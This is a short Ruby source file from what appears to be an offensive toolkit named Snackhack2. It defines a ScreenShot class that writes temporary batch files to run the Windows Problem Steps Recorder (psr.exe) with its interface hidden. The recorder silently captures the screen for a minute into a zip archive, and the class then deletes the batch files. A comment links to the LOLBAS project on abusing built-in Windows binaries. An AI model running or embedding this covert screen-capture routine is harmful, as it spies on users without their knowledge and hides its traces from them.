require 'shellwords'
module Snackhack2
	class ScreenShot
		attr_accessor :zip, :time
		# https://lolbas-project.github.io/lolbas/Binaries/Psr/
	    def initialize
	    	@zip = "screenshots.zip"
	    	@time = 60
	    end
	    def run
	    	File.open("lol.bat", 'w+') { |file| file.write("psr.exe /start /output #{@zip} /sc 1 /gui 0") }
	    	File.open("lol2.bat", 'w+') { |file| file.write("psr.exe /stop") }
	    	Process.spawn("lol.bat")
	    	sleep @time.to_i
	    	system("lol2.bat")
	    	sleep 2
	    	File.delete("lol.bat")
	    	File.delete("lol2.bat")
	    end
	end
end